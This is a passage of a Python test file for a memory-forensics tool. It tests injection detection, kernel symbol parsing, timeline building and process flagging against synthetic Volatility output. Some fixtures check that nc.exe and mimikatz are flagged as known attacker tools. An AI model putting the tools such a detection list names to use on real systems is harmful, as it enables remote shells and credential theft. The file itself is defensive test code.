          w._is_injection("PAGE_READONLY", True) is None)
    check("private data (RW, no exec) -> not flagged",
          w._is_injection("PAGE_READWRITE", False) is None)
    lin = _load_os_module("linux")
    check("linux wx region -> flag", lin._is_injection("rwxp", False) is not None)
    check("linux r-x file-backed -> not flagged", lin._is_injection("r-xp", True) is None)


def test_injection_correlator():
    from modules import injection_correlator as ic
    print("[injection_correlator]")

    # header detection per OS
    check("MZ header detected (Windows)",
          ic.detect_header({"Hexdump": "0x1f0000\t4d 5a 90 00\tMZ.."}, "windows")[0])
    check("ELF header detected (Linux)",
          ic.detect_header({"Hexdump": "0x400000\t7f 45 4c 46 02\t.ELF"}, "linux")[0])
    check("Mach-O header detected (macOS)",
          ic.detect_header({"Hexdump": "0x1000\tcf fa ed fe 07\t...."}, "macos")[0])
    check("no header on random bytes",
          not ic.detect_header({"Hexdump": "0x1000\t00 11 22 33\t...."}, "windows")[0])

    # confidence classification (the core engine)
    malfind = [
        {"PID": 1337, "Process": "evil.exe", "Start VPN": 0x1f0000, "End VPN": 0x1fffff,
         "Protection": "PAGE_EXECUTE_READWRITE", "PrivateMemory": 1,
         "Hexdump": "0x1f0000\t4d 5a 90 00\tMZ.."},
        {"PID": 2000, "Process": "proc.exe", "Start VPN": 0x400000, "End VPN": 0x40ffff,
         "Protection": "PAGE_EXECUTE_READWRITE", "PrivateMemory": 1, "Hexdump": ""},
    ]
    ldr = [
        {"Pid": 1337, "Process": "evil.exe", "Base": 0x1f0000,
         "InLoad": False, "InInit": False, "InMem": False, "MappedPath": ""},
        {"Pid": 5, "Process": "svc.exe", "Base": 0x7ff000,
         "InLoad": False, "InInit": False, "InMem": False, "MappedPath": ""},
        {"Pid": 9, "Process": "good.exe", "Base": 0x140000,
         "InLoad": True, "InInit": True, "InMem": True, "MappedPath": "C:\\good.exe"},
    ]
    inj, mods = ic.parse_windows(malfind, ldr)
    f = ic.correlate(inj, mods, "windows")
    by = {}
    for x in f:
        by[x["confidence"]] = by.get(x["confidence"], 0) + 1
    check("malfind + unlinked module -> HIGH", by.get("HIGH") == 1, detail=str(by))
    check("malfind alone -> MEDIUM", by.get("MEDIUM") == 1, detail=str(by))
    check("module anomaly alone -> LOW", by.get("LOW") == 1, detail=str(by))
    check("registered+backed module -> not flagged",
          not any(str(x["pid"]) == "9" for x in f))

    # Linux path (proc.Maps: backing path = registered)
    li, lm = ic.parse_linux(
        [{"PID": 42, "Process": "x", "Start": 0x1000, "End": 0x2000,
          "Protection": "rwx", "Hexdump": "0x1000\t7f 45 4c 46\t.ELF"}],
        [{"PID": 42, "Start": 0x1000, "End": 0x2000, "Flags": "rwxp", "File Path": ""}])
    lf = ic.correlate(li, lm, "linux")
    check("linux anon rwx + malfind -> HIGH",
          any(x["confidence"] == "HIGH" for x in lf), detail=str(lf))

    # dump.mem: file name unreadable (File Path null) is not 'unbacked'; a VMA
    # 0x0-0x7f63eb874000 is a smeared vm_area_struct
    li, lm = ic.parse_linux(
        [{"PID": 7, "Process": "anacron", "Start": 0x7f07826fd000, "End": 0x7f078270a000,
          "Protection": "r-x"},
         {"PID": 7, "Process": "anacron", "Start": 0x0, "End": 0x7f63eb874000,
          "Protection": "r-x"}],
        [{"PID": 7, "Start": 0x7f07826fd000, "End": 0x7f078270a000, "Flags": "r-x",
          "File Path": None},
         {"PID": 7, "Start": 0x7f0782b33000, "End": 0x7f0782b55000, "Flags": "r-x",
          "File Path": None}])
    lf = {x["base_address"]: x for x in ic.correlate(li, lm, "linux")}
    check("linux malfind + unreadable file name -> MEDIUM (not HIGH)",
          lf.get(0x7f07826fd000, {}).get("confidence") == "MEDIUM", detail=str(lf))
    check("linux malfind on a smeared 127 TiB VMA -> LOW",
          lf.get(0x0, {}).get("confidence") == "LOW", detail=str(lf))
    check("linux unreadable-name exec VMA alone -> no LOW anomaly",
          0x7f0782b33000 not in lf, detail=str(lf))

    # OS pre-check: Windows kernel markers (ASCII or UTF-16) -> windows.info first
    import tempfile as _tf
    from modules import linux_identify as _li
    with _tf.TemporaryDirectory() as td:
        pw, pl = Path(td) / "w.raw", Path(td) / "l.raw"
        pw.write_bytes(b"\x00" * 4096 + "\\SystemRoot\\system32\\NTOSKRNL.EXE".encode("utf-16-le"))
        pl.write_bytes(b"\x00" * 4096 + b"Linux version 6.5.0-41-generic (buildd@lcy02) (gcc")
        check("windows_hint: UTF-16 ntoskrnl marker -> True, Linux banner -> False",
              _li.windows_hint(str(pw)) and not _li.windows_hint(str(pl)))

    from modules import platform_compat as _pc
    _orig = (_pc.storage_is_rotational, _pc.available_ram_gb)
    try:
        with _tf.NamedTemporaryFile(delete=False) as _f:
            _f.truncate(3 * 1024 ** 3)        # sparse 3 GB file
        _pc.available_ram_gb = lambda: 2.0
        _pc.storage_is_rotational = lambda p: True
        hdd_big = _pc.io_limited_jobs(_f.name, 4)
        _pc.available_ram_gb = lambda: 8.0
        hdd_fits = _pc.io_limited_jobs(_f.name, 4)
        _pc.storage_is_rotational = lambda p: False
        _pc.available_ram_gb = lambda: 2.0
        ssd_big = _pc.io_limited_jobs(_f.name, 4)
        check("io_limited_jobs: HDD+dump>RAM -> 1; HDD+fits -> 4; SSD -> 4",
              (hdd_big, hdd_fits, ssd_big) == (1, 4, 4), detail=str((hdd_big, hdd_fits, ssd_big)))
    finally:
        _pc.storage_is_rotational, _pc.available_ram_gb = _orig
        os.unlink(_f.name)

    from modules.volatility import VolatilityWrapper as _VW
    check("windows.info build parse (Win11 22621 / Win7 7601 / none)",
          (_VW._windows_build("NtBuildLab\t22621.1.amd64fre.ni_release")
           , _VW._windows_build("Major/Minor 15.7601"), _VW._windows_build("x")) == (22621, 7601, 0))

    # btf2isf: tk_core (anonymous struct) is synthesized with the C layout
    from modules import btf2isf as _b
    ut = {"seqcount_raw_spinlock": {"size": 4, "fields": {}},
          "timekeeper": {"size": 280, "fields": {}}}
    n = _b._tk_core_type(ut)
    check("btf2isf: tk_core type synthesized (seq@0, timekeeper@8, size 288 = DWARF)",
          n and ut[n]["fields"]["timekeeper"]["offset"] == 8 and ut[n]["size"] == 288,
          detail=str(ut.get(n)))
    check("btf2isf: 6.13+ named tk_data preferred",
          _b._tk_core_type({"tk_data": {"size": 600, "fields": {"timekeeper": {}}}}) == "tk_data")

    # run_health: pstree count descends Vol3 '__children' nesting
    from modules import run_health as rh
    tree = [{"PID": 1, "__children": [{"PID": 2, "__children": []},
                                      {"PID": 3, "__children": [{"PID": 4}]}]}]
    check("pstree count includes nested children", rh._count_tree(tree) == 4)

    # JIT runtimes: anon exec w/o header -> MEDIUM; with ELF header stays HIGH
    def _jit(name, hexdump):
        a, b = ic.parse_linux(
            [{"PID": 7, "Process": name, "Start": 0x1000, "End": 0x2000,
              "Protection": "r-x", "Hexdump": hexdump}],
            [{"PID": 7, "Start": 0x1000, "End": 0x2000, "Flags": "r-xp", "File Path": ""}])
        return ic.correlate(a, b, "linux")[0]["confidence"]
    check("JIT process (Web Content) anon exec, no header -> MEDIUM",
          _jit("Web Content", "0x1000\t48 89 e5 90\tH...") == "MEDIUM")
    check("JIT process with ELF header stays HIGH",
          _jit("firefox-bin", "0x1000\t7f 45 4c 46\t.ELF") == "HIGH")
    jp = ic.jit_pids_from_modules([{"PID": 9, "Path": r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clrjit.dll"},
                                   {"PID": 10, "Path": r"C:\Windows\System32\kernel32.dll"}])
    wi, wm = ic.parse_windows([{"PID": 9, "Process": "Dell.TechHub", "Start VPN": 0x1000,
                                "End VPN": 0x2000, "Protection": "PAGE_EXECUTE_READWRITE"}], [])
    check("module-detected JIT (.NET clrjit) -> malfind-only MEDIUM becomes LOW",
          jp == {"9"} and ic.correlate(wi, wm, "windows", jit_pids=jp)[0]["confidence"] == "LOW")
    check("non-JIT process anon exec stays HIGH",
          _jit("sshd", "0x1000\t48 89 e5 90\tH...") == "HIGH")

    # auto-OS detection
    check("auto-detect Windows", ic.detect_os_from_data(malfind, ldr) == "windows")
    check("os alias mac->macos", ic._norm_os("mac") == "macos")


def test_btf2isf():
    """In-image BTF -> Vol3 ISF builder. Exercises the parser + the two subtle
    transforms Vol3 depends on (anonymous-member flattening, typedef-anonymous
    naming) and the kallsyms token decode + address arithmetic — all on a tiny
    hand-crafted BTF blob, no memory image required."""
    import struct
    from modules import btf2isf as b

    K_INT, K_STRUCT, K_TYPEDEF = 1, 4, 8
    strs = bytearray(b"\x00")

    def s(name):
        if not name:
            return 0
        off = len(strs)
        strs.extend(name.encode() + b"\x00")
        return off

    o_int, o_point, o_x, o_y = s("int"), s("point"), s("x"), s("y")
    o_val, o_capt = s("val"), s("cap_t")
    o_cont, o_flag, o_inner = s("container"), s("flag"), s("inner_a")

    def T(name_off, kind, vlen, sz):
        return struct.pack("<III", name_off, (kind << 24) | vlen, sz)

    types = bytearray()
    # 1: INT int (signed, 4 bytes) — extra u32 = (encoding<<24)|bits
    types += T(o_int, K_INT, 0, 4) + struct.pack("<I", (1 << 24) | 32)
    # 2: STRUCT point { x @bit0, y @bit32 }
    types += T(o_point, K_STRUCT, 2, 8)
    types += struct.pack("<III", o_x, 1, 0) + struct.pack("<III", o_y, 1, 32)
    # 3: STRUCT (anonymous) { val } — the typedef target
    types += T(0, K_STRUCT, 1, 8) + struct.pack("<III", o_val, 1, 0)
    # 4: TYPEDEF cap_t -> 3
    types += T(o_capt, K_TYPEDEF, 0, 3)
    # 5: STRUCT (anonymous inner) { inner_a }
    types += T(0, K_STRUCT, 1, 4) + struct.pack("<III", o_inner, 1, 0)
    # 6: STRUCT container { <anonymous struct 5> @0, flag @bit32 }
    types += T(o_cont, K_STRUCT, 2, 8)
    types += struct.pack("<III", 0, 5, 0) + struct.pack("<III", o_flag, 1, 32)

    hdr = struct.pack("<HBBIIIII", 0xEB9F, 1, 0, 24,
                      0, len(types), len(types), len(strs))
    blob = hdr + bytes(types) + bytes(strs)

    base, user, enums, _ = b.build_isf_types(b.BTF(blob))

    check("btf: signed int base type (size 4)",
          base.get("int", {}).get("size") == 4 and base["int"]["signed"] is True,
          detail=str(base.get("int")))
    pf = user.get("point", {}).get("fields", {})
    check("btf: struct fields at correct byte offsets (x@0, y@4)",
          user.get("point", {}).get("size") == 8
          and pf.get("x", {}).get("offset") == 0
          and pf.get("y", {}).get("offset") == 4, detail=str(pf))
    check("btf: typedef'd anonymous struct named after the typedef (cap_t)",
          "cap_t" in user and "val" in user["cap_t"]["fields"],
          detail=str([k for k in user])[:120])

    cf = user.get("container", {}).get("fields", {})
    anon = [k for k, v in cf.items() if v.get("anonymous")]
    check("btf: anonymous member carries anonymous:true (Vol3 flatten flag)",
          len(anon) == 1, detail=str(cf))
    if anon:
        at = cf[anon[0]]["type"]
        check("btf: anon member points to a registered user_type",
              at.get("kind") == "struct" and at.get("name") in user, detail=str(at))
        check("btf: that inner type keeps its field (inner_a)",
              "inner_a" in user.get(at.get("name"), {}).get("fields", {}))
    check("btf: container.flag @4", cf.get("flag", {}).get("offset") == 4)

    # ---- kallsyms: token decompression + base-relative address arithmetic ----
    tokens = [bytes([i]) for i in range(256)]
    tokens[200] = b"task"                       # a multi-character token
    # "init_task" = nm-type char 'T' (skipped) + i n i t _ + token200("task")
    name_ids = bytes([ord("T"), ord("i"), ord("n"), ord("i"),
                      ord("t"), ord("_"), 200])
    names = bytes([len(name_ids)]) + name_ids
    rb = 0xFFFFFFFF81000000
    d = b._decode_names_arr(struct.pack("<i", 0x234000), names, 1, rb, tokens, False)
    check("kallsyms: multi-token name decodes to init_task", "init_task" in d,
          detail=str(d))
    check("kallsyms: non-percpu addr = relative_base + offset",
          d.get("init_task") == 0xFFFFFFFF81234000,
          detail=hex(d.get("init_task", 0)))
    dp = b._decode_names_arr(struct.pack("<i", 0x50), names, 1, rb, tokens, True)
    check("kallsyms: percpu positive offset is absolute",
          dp.get("init_task") == 0x50, detail=hex(dp.get("init_task", 0)))
    dn = b._decode_names_arr(struct.pack("<i", -0x10), names, 1, rb, tokens, True)
    check("kallsyms: percpu negative offset = base-1-offset",
          dn.get("init_task") == rb - 1 - (-0x10),
          detail=hex(dn.get("init_task", 0)))


def test_btf2isf_resolver_glue():
    """The _try_btf2isf_build() connector wired into the Linux resolver — no image
    needed: stub build_isf + the Vol3 install/cache helpers and verify the glue's
    own behavior — (a) kernel version parsed from the ISF filename, (b) a no-BTF
    result returns None so the resolver falls through to dbgsym, (c) a non-Linux
    OS short-circuits without ever calling the builder."""
    import importlib.util
    from modules import btf2isf

    p = ROOT / "modules" / "linux_resolver.linux.py"
    spec = importlib.util.spec_from_file_location("linux_resolver.linux", p)
    lr = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(lr)

    # isolate from Volatility: stub the store-install + cache-refresh
    lr._install_isf = lambda *a, **k: True
    lr._refresh_isf_cache_after_install = lambda *a, **k: None

    saved = btf2isf.build_isf
    try:
        # (a) success: build_isf drops a canned ISF; glue parses kver from name
        def fake_ok(image, out_dir=None, verbose=True):
            f = Path(out_dir) / "Kali_6.12.13-amd64_btf.json.xz"
            f.write_text("{}")
            return str(f)
        btf2isf.build_isf = fake_ok
        kver = lr._try_btf2isf_build("/img.lime", Path("/tmp/vol3"), "linux")
        check("glue: kernel version parsed from ISF filename",
              kver == "6.12.13-amd64", detail=repr(kver))

        # (b) no embedded BTF -> None so the resolver falls through to dbgsym
        btf2isf.build_isf = lambda *a, **k: None
        check("glue: no-BTF build -> None (fall-through)",
              lr._try_btf2isf_build("/img.lime", Path("/tmp/vol3"), "linux") is None)

        # (c) non-Linux OS short-circuits without ever calling the builder
        calls = []
        btf2isf.build_isf = lambda *a, **k: calls.append(1)
        r = lr._try_btf2isf_build("/img.lime", Path("/tmp/vol3"), "mac")
        check("glue: non-Linux OS -> None, builder not called",
              r is None and not calls, detail=f"r={r} calls={len(calls)}")
    finally:
        btf2isf.build_isf = saved


def test_timeline_linux_file_events():
    """Timeline must not be empty on a healthy Linux run.

    Regression for kali-linux-2026.1 (2026-07-22): 19/19 plugins OK, 358
    processes, and **0 timeline events**. Five of the timeline's eight sources
    (shimcache/userassist/mftscan/svcscan/evtx) are Windows-only, so on Linux the
    only source that ever fired was pslist's CREATION TIME — and Vol3 derives
    that from the boot time, which returns None when the kernel's timekeeping
    symbols aren't recoverable. One upstream failure emptied the whole tab while
    ~66k file timestamps sat unused in pagecache/lsof.

    Pins that the Linux file sources work, dedup correctly, and stay OS-safe."""
    import logging, tempfile, shutil
    from modules.timeline import Timeline, _parse_ts

    # Vol3's Linux plugins emit "...T00:18:35+00:00" (25 chars); a blind s[:23]
    # slice left "...T00:18:35+00:" — a half-severed offset that breaks strict
    # CSV/SIEM parsers. Must normalise, not truncate.
    check("timeline: ISO+offset keeps whole seconds, no severed tz",
          _parse_ts("2013-09-30T00:18:35+00:00") == "2013-09-30T00:18:35",
          detail=repr(_parse_ts("2013-09-30T00:18:35+00:00")))
    check("timeline: microseconds trimmed to milliseconds",
          _parse_ts("2026-07-03T21:52:21.123456+00:00") == "2026-07-03T21:52:21.123")
    check("timeline: Windows-style stamp unchanged",
          _parse_ts("2026-07-03 21:52:21.000000 UTC") == "2026-07-03 21:52:21.000")
    check("timeline: placeholder epochs still rejected",
          _parse_ts("1970-01-01T00:00:00+00:00") is None
          and _parse_ts("1601-01-01 00:00:00") is None)

    tmp = Path(tempfile.mkdtemp())
    jd = tmp / "json"
    jd.mkdir()
    try:
        # pslist with CREATION TIME null — exactly the observed failure.
        (jd / "linux_pslist_PsList.json").write_text(json.dumps([
            {"COMM": "systemd", "PID": 1, "PPID": 0, "CREATION TIME": None},
            {"COMM": "bash", "PID": 900, "PPID": 1, "CREATION TIME": None}]))
        (jd / "linux_pagecache_Files.json").write_text(json.dumps([
            # all three times identical -> ONE event (the _load_mft dedup rule)
            {"FilePath": "/etc/passwd", "FileType": "REG",
             "ModificationTime": "2026-07-03T21:52:21+00:00",
             "AccessTime": "2026-07-03T21:52:21+00:00",
             "ChangeTime": "2026-07-03T21:52:21+00:00"},
            # three distinct times -> THREE events
            {"FilePath": "/tmp/evil.sh", "FileType": "REG",
             "ModificationTime": "2026-07-01T10:00:00+00:00",
             "AccessTime": "2026-07-02T11:00:00+00:00",
             "ChangeTime": "2026-07-03T12:00:00+00:00"},
            # no path -> skipped entirely
            {"FilePath": "", "ModificationTime": "2026-07-03T21:52:21+00:00"},
            # epoch-0 placeholder -> filtered by _parse_ts
            {"FilePath": "/proc/self", "ModificationTime": "1970-01-01T00:00:00+00:00"},
        ]))
        (jd / "linux_lsof_Lsof.json").write_text(json.dumps([
            # socket: belongs to _load_network, must NOT become a file event
            {"Path": "socket:[25692]", "Type": "SOCK", "PID": 1,
             "Process": "systemd", "Accessed": "1970-01-01T00:00:00+00:00",
             "Modified": "1970-01-01T00:00:00+00:00"},
            # real open file, attributed to a process
            {"Path": "/var/log/auth.log", "Type": "REG", "PID": 900,
             "Process": "bash", "Modified": "2026-07-03T22:13:14+00:00",
             "Accessed": "2026-07-03T22:13:14+00:00"},
        ]))

        tl = Timeline(logging.getLogger("test"))
        n = tl.load(tmp)
        check("timeline: Linux run is no longer empty", n > 0, detail=f"{n} events")

        by_src = {}
        for e in tl._events:
            by_src.setdefault(e["source"], []).append(e)
        check("timeline: pagecache contributes file events",
              len(by_src.get("pagecache", [])) == 4,
              detail=str(len(by_src.get("pagecache", []))))
        check("timeline: identical A/M/C collapse to one event",
              sum(1 for e in by_src.get("pagecache", [])
                  if "/etc/passwd" in e["detail"]) == 1)
        check("timeline: distinct A/M/C yield three events",
              sum(1 for e in by_src.get("pagecache", [])
                  if "/tmp/evil.sh" in e["detail"]) == 3)
        check("timeline: epoch-0 file time still filtered",
              not any("/proc/self" in e["detail"] for e in tl._events))
        check("timeline: path-less row skipped",
              all(e["detail"].strip() for e in tl._events))

        lsof_ev = by_src.get("lsof", [])
        check("timeline: lsof real file becomes an event", len(lsof_ev) == 1,
              detail=str(len(lsof_ev)))
        check("timeline: lsof file event carries PID attribution",
              lsof_ev and lsof_ev[0]["pid"] == "900"
              and lsof_ev[0]["process"] == "bash",
              detail=str(lsof_ev[:1]))
        check("timeline: lsof socket row is NOT a file event",
              not any("socket:[" in e["detail"] for e in lsof_ev))
        check("timeline: events sorted chronologically",
              [e["timestamp"] for e in tl._events]
              == sorted(e["timestamp"] for e in tl._events))

        # Windows/macOS runs have no pagecache/lsof JSON — must be a clean no-op.
        wtmp = Path(tempfile.mkdtemp())
        (wtmp / "json").mkdir()
        (wtmp / "json" / "mac_pslist_PsList.json").write_text(json.dumps([
            {"NAME": "launchd", "PID": 1, "PPID": 0,
             "Start Time": "2026-07-03 21:52:21"}]))
        try:
            tl2 = Timeline(logging.getLogger("test"))
            n2 = tl2.load(wtmp)
            check("timeline: mac pslist 'Start Time' still produces events",
                  n2 == 1, detail=f"{n2} events")
            check("timeline: no pagecache/lsof JSON -> loader is a safe no-op",
                  all(e["source"] not in ("pagecache", "lsof") for e in tl2._events))
        finally:
            shutil.rmtree(wtmp, ignore_errors=True)
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


def test_extraction_v2():
    """Phase 7: case index, extraction manifest helpers and the FP fixes found
    while testing extraction on the real samples."""
    import importlib.util
    import lzma
    import shutil
    import tempfile
    print("[extraction v2]")
    from modules import case_index as ci
    from modules import extract_jobs as xj
    from modules import string_hunt as sh

    check("safe_name keeps a leading dot", ci.safe_name(".bash_history") == ".bash_history")
    check("safe_name never returns '..'", ci.safe_name("..") == "item")
    check("safe_name strips path separators", "/" not in ci.safe_name("/etc/passwd"))
    tmp = Path(tempfile.mkdtemp())
    try:
        # describe(): type sniffing + all-zero detection
        (tmp / "a.exe").write_bytes(b"MZ" + b"\0" * 100 + b"x")
        (tmp / "z.bin").write_bytes(b"\0" * 4096)
        d1, d2 = xj.describe(tmp / "a.exe"), xj.describe(tmp / "z.bin")
        check("describe: PE sniffed", d1["type"].startswith("PE"), d1["type"])
        check("describe: all-zero file is flagged", d2["nonzero_pct"] == 0.0 and "zeros" in d2["type"])
        # case index on a synthetic Windows case
        case = tmp / "case"
        (case / "json").mkdir(parents=True)
        (case / "SUMMARY.txt").write_text("Image:      C:/x.raw\nOS:         windows\nVolatility: vol3\n"
                                          "Profile:    Win7SP1x64\n", encoding="utf-8")
        (case / "json" / "windows_filescan_FileScan.json").write_text(json.dumps(
            [{"Name": "\\Windows\\System32\\drivers\\etc\\hosts", "Offset": 0x7d87fdc0},
             {"Name": "\\$Directory", "Offset": 16}]), encoding="utf-8")
        (case / "json" / "windows_pslist_PsList.json").write_text(json.dumps(
            [{"PID": 300, "PPID": 4, "ImageFileName": "csrss.exe", "Threads": 9},
             {"PID": 356, "PPID": 4, "ImageFileName": "csrss.exe", "Threads": 9},
             {"PID": 500, "PPID": 4, "ImageFileName": "lsass.exe", "Threads": 9},
             {"PID": 501, "PPID": 4, "ImageFileName": "lsass.exe", "Threads": 9}]), encoding="utf-8")
        (case / "json" / "windows_vadinfo_VadInfo.json").write_text(json.dumps(
            [{"PID": 300, "Start VPN": 0x3bd0000, "End VPN": 0x3bdffff,
              "Protection": "PAGE_EXECUTE_READWRITE", "Tag": "VadS", "File": "N/A"},
             {"PID": 300, "Start VPN": 0x77640000, "End VPN": 0x777fffff,
              "Protection": "PAGE_EXECUTE_WRITECOPY", "Tag": "Vad ", "File": "\\Windows\\ntdll.dll"}]),
            encoding="utf-8")
        info = ci.read_summary(case)
        check("read_summary: os/engine/profile", (info["os"], info["engine"], info["profile"]) ==
              ("windows", "vol3", "Win7SP1x64"), str(info))
        src, rows = ci.file_list(case)
        check("file_list: filescan rows with hex offsets", len(rows) == 2 and rows[0]["offset"] == "0x7d87fdc0")
        procs = {p["pid"]: p for p in ci.process_list(case)}
        check("csrss: two instances are NOT flagged (one per session)", not procs["300"]["flags"],
              str(procs["300"]["flags"]))
        check("lsass: two instances ARE flagged", any("Multiple" in f for f in procs["500"]["flags"]))
        known, regs = ci.region_list(case, "300")
        check("region_list: known + 2 regions", known and len(regs) == 2)
        check("region_list: RWX private region flagged", bool(regs[0]["injection"]), str(regs[0]))
        check("region_list: image WRITECOPY region not flagged", regs[1]["injection"] == "")
        check("region_list: inclusive end -> 64 KB", regs[0]["size"] == 0x10000, str(regs[0]["size"]))
        check("region_list: unknown PID -> not known", ci.region_list(case, "999")[0] is False)
        # Windows psscan: exited / acquisition-smear processes are not "Hidden"; tool names whole-word
        wc = tmp / "wcase"
        (wc / "json").mkdir(parents=True)
        (wc / "SUMMARY.txt").write_text("OS: windows\nVolatility: vol3\n", encoding="utf-8")
        (wc / "json" / "windows_info_Info.json").write_text(json.dumps(
            [{"Variable": "SystemTime", "Value": "2026-11-12 14:02:42+00:00"}]), encoding="utf-8")
        (wc / "json" / "windows_pslist_PsList.json").write_text(json.dumps(
            [{"PID": 4, "PPID": 0, "ImageFileName": "System", "Threads": 200, "ExitTime": None},
             {"PID": 88, "PPID": 4, "ImageFileName": "Secure System", "Threads": 0, "ExitTime": None},
             {"PID": 832, "PPID": 4, "ImageFileName": "ChatGPT.exe", "Threads": 0,
              "ExitTime": "2026-11-12T10:00:00+00:00"},
             {"PID": 900, "PPID": 4, "ImageFileName": "ShellExperienc", "Threads": 20, "ExitTime": None},
             {"PID": 901, "PPID": 4, "ImageFileName": "nc.exe", "Threads": 2, "ExitTime": None},
             {"PID": 902, "PPID": 4, "ImageFileName": "mimikatz64.exe", "Threads": 2, "ExitTime": None},
             {"PID": 903, "PPID": 4, "ImageFileName": "weird.exe", "Threads": 0, "ExitTime": None}]),
            encoding="utf-8")
        (wc / "json" / "windows_psscan_PsScan.json").write_text(json.dumps(
            [{"PID": 32, "PPID": 4, "ImageFileName": "OAWrapper.exe", "Threads": 0,
              "CreateTime": "2026-11-12T14:00:33+00:00", "ExitTime": "2026-11-12T14:00:33+00:00"},
             {"PID": 12136, "PPID": 4, "ImageFileName": "backgroundTask.exe", "Threads": 9,
              "CreateTime": "2026-11-12T14:04:23+00:00", "ExitTime": None},
             {"PID": 1200, "PPID": 4, "ImageFileName": "RuntimeBroker.exe", "Threads": 3,
              "CreateTime": "2026-11-12T13:58:00+00:00", "ExitTime": None},
             {"PID": 666, "PPID": 4, "ImageFileName": "evil.exe", "Threads": 5,
              "CreateTime": "2026-11-10T09:00:00+00:00", "ExitTime": None}]), encoding="utf-8")
        wp = {p["pid"]: p for p in ci.process_list(wc)}
        check("win: exited psscan-only process not flagged", not wp["32"]["flags"], str(wp["32"]))
        check("win: exited pslist process with 0 threads not flagged", not wp["832"]["flags"], str(wp["832"]))
        check("win: Secure System 0 threads not flagged", not wp["88"]["flags"], str(wp["88"]))
        check("win: running 0-thread process IS flagged", any("Zero" in f for f in wp["903"]["flags"]))
        check("win: psscan-only created after capture clock not flagged", not wp["12136"]["flags"],
              str(wp["12136"]))
        check("win: psscan-only started 4 min before capture -> smear note",
              any("smear" in f for f in wp["1200"]["flags"]), str(wp["1200"]))
        check("win: old running psscan-only IS Hidden", any("Hidden" in f for f in wp["666"]["flags"]))
        check("win: 'nc' not matched inside ShellExperienc", not wp["900"]["flags"], str(wp["900"]))
        check("win: nc.exe IS a known tool", any("nc" in f for f in wp["901"]["flags"]))
        check("win: mimikatz64.exe IS a known tool (long name substring)",
              any("mimikatz" in f for f in wp["902"]["flags"]))
        # Linux psscan: exited + garbage tasks are not "Hidden"
        lc = tmp / "lcase"
        (lc / "json").mkdir(parents=True)
        (lc / "SUMMARY.txt").write_text("OS: linux\nVolatility: vol3\n", encoding="utf-8")
        (lc / "json" / "linux_pslist_PsList.json").write_text(json.dumps(
            [{"PID": 1, "PPID": 0, "COMM": "init"}, {"PID": 900, "PPID": 1, "COMM": "sshd"},
             {"PID": 901, "PPID": 900, "COMM": "sshd"}]), encoding="utf-8")
        (lc / "json" / "linux_psscan_PsScan.json").write_text(json.dumps(
            [{"PID": 2664, "PPID": 1, "COMM": "ip", "EXIT_STATE": "EXIT_DEAD"},
             {"PID": 20172211, "PPID": 0, "COMM": "", "EXIT_STATE": "TASK_RUNNING"},
             {"PID": 1000, "PPID": 0, "COMM": "\x02", "EXIT_STATE": "TASK_RUNNING"},
             {"PID": 4444, "PPID": 1, "COMM": "evil", "EXIT_STATE": "TASK_RUNNING"}]), encoding="utf-8")
        lp = {p["pid"]: p for p in ci.process_list(lc)}
        check("linux: EXIT_DEAD psscan task not flagged Hidden", not lp["2664"]["flags"], str(lp["2664"]))
        check("linux: garbage psscan tasks dropped", "20172211" not in lp and "1000" not in lp)
        check("linux: running psscan-only task IS Hidden", any("Hidden" in f for f in lp["4444"]["flags"]))
        check("linux: sshd under init (sysvinit) not flagged", not lp["900"]["flags"], str(lp["900"]))
        check("linux: sshd session child of sshd not flagged", not lp["901"]["flags"], str(lp["901"]))
        # btf2isf.retype_isf adds the memory-layout base types
        from modules import btf2isf
        isf = {"symbols": {"vmemmap_base": {"address": 1}, "page_offset_base": {"address": 2}},
               "user_types": {}, "base_types": {"long unsigned int": {"size": 8}}}
        p = tmp / "k_btf.json.xz"
        with lzma.open(p, "wb") as f:
            f.write(json.dumps(isf).encode())
        n = btf2isf.retype_isf(p)
        with lzma.open(p, "rb") as f:
            out = json.loads(f.read())
        check("retype_isf: vmemmap_base typed", n == 2 and out["symbols"]["vmemmap_base"].get("type") ==
              {"kind": "base", "name": "long unsigned int"}, str(out["symbols"]))
        # dwarf2json struct-page collision repair (Ubuntu 5.4 azure)
        from modules import isf_repair
        bad = {"base_types": {"long unsigned int": {"size": 8}},
               "user_types": {
                   "list_head": {"kind": "struct", "size": 16, "fields": {}},
                   "address_space": {"kind": "struct", "size": 200, "fields": {}},
                   "page": {"kind": "struct", "size": 64, "fields": {
                       "flags": {"offset": 0, "type": {"kind": "base", "name": "long unsigned int"}},
                       "unnamed_field_8": {"offset": 8, "anonymous": True,
                                           "type": {"kind": "union", "name": "u8"}}}},
                   "u8": {"kind": "union", "size": 40, "fields": {
                       "unnamed_field_0": {"offset": 0, "anonymous": True,
                                           "type": {"kind": "struct", "name": "dev"}}}},
                   "dev": {"kind": "struct", "size": 16, "fields": {}}}}
        fx = isf_repair.repair_isf(bad)
        var = bad["user_types"].get("rambreaker_page_cache_variant", {}).get("fields", {})
        check("isf_repair: restores page.mapping at union+16", fx and var.get("mapping", {}).get("offset") == 16,
              str(fx))
        check("isf_repair: idempotent (mapping now reachable)", isf_repair.repair_isf(bad) == [])
        good = {"base_types": {"long unsigned int": {}}, "user_types": {
            "list_head": {"size": 16, "fields": {}}, "address_space": {"fields": {}},
            "page": {"size": 64, "fields": {"mapping": {"offset": 24, "type": {}}}}}}
        check("isf_repair: correct ISF untouched", isf_repair.repair_isf(good) == [])
        # Vol2 linux_yarascan text -> one hit per match
        txt = ("Task: nc pid 2169 rule r1 addr 0x8bdf2a8\n"
               "0x08bdf2a8  31 39 32 2e 31 36 38 2e 35 36 2e 31 00 00 00 00   192.168.56.1....\n"
               "0x08bdf2b8  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................\n"
               "Task: bash pid 2042 rule r1 addr 0x897c81d\n"
               "0x0897c81d  31 39 32 2e 31 36 38 2e 35 36 2e 31 20 38 38 38   192.168.56.1.888\n")
        hits = sh._parse_vol2_hits(txt, {"$s0": "192.168."})
        check("vol2 linux yarascan: one hit per match", len(hits) == 2, str(len(hits)))
        check("vol2 linux yarascan: pid/process parsed",
              [(h["pid"], h["process"]) for h in hits] == [(2169, "nc"), (2042, "bash")], str(hits[:1]))
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


def test_timeout_model_formats():
    """Crash dumps get a per-plugin measured ratio; raw-image fits stay clean."""
    import tempfile, shutil
    from modules import timeout_model as tm
    tmp = Path(tempfile.mkdtemp())
    try:
